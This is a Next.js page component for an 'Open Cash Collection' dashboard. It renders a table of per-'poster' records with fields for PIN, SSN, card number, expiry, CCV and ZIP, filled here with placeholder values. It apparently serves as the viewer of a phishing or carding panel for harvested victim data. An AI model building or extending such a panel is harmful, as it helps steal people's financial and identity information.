import { useSession } from "next-auth/react";
import { FaEnvelope } from "react-icons/fa";
import Loader from "../components/common/Loader";
import Table from "../components/Table";
import { collectionColumn } from "../components/Table/columns/collectionColumn";
import { openCashColumn } from "../components/Table/columns/openCashColumn";
import useGetData from "../hooks/useGetData";

function OpenCashPage() {
  // const { username, password, posterId, links, details } = data?.data;

  const { data } = useSession();
  const id = data?.user?.id;
  // console.log("poster session", id);

  // const { fetchedData, isLoading } = useGetData(`/poster/details/${id}`);

  // const details = fetchedData?.data?.details;

  // console.log(details);

  const details = [
    {
      contact: "1234",
      code: "abcd",
      pin: "abcd",
      ssn: "abcd",
      site: "abcd",
      card_number: "abcd",
      mm_yy: "abcd",
      ccv: "abcd",
      zip: "abcd",
    },
  ];

  return (
    <div className="relative">
      <div className="flex items-center gap-3">
        <span className="text-[28px] text-custom-blue2">
          <FaEnvelope />
        </span>
        <h1 className="text-2xl font-bold text-custom-gray2">
          Open Cash Collection
        </h1>
      </div>

      {/* <Loader isLoading={isLoading}> */}
      <div className="mt-7">
        <div className="p-4 bg-white rounded shadow-md lg:p-8">
          <Table columnsHeading={openCashColumn} usersData={details} />
          {/* {details && (
              <Table columnsHeading={collectionColumn} usersData={details} />
            )} */}
        </div>
      </div>
      {/* </Loader> */}
    </div>
  );
}

// export async function getServerSideProps(context) {
//   const session = await getSession(context);
//   const id = session?.user?.id;

//   console.log("session", id);

//   const url = `${API_URL}/poster/details/${id}`;
//   const res = await fetch(url);
//   const data = await res.json();

//   // console.log(data);

//   if (res.ok) {
//     return { props: { data } };
//   } else {
//     return {
//       notFound: true,
//     };
//   }
// }

export default OpenCashPage;
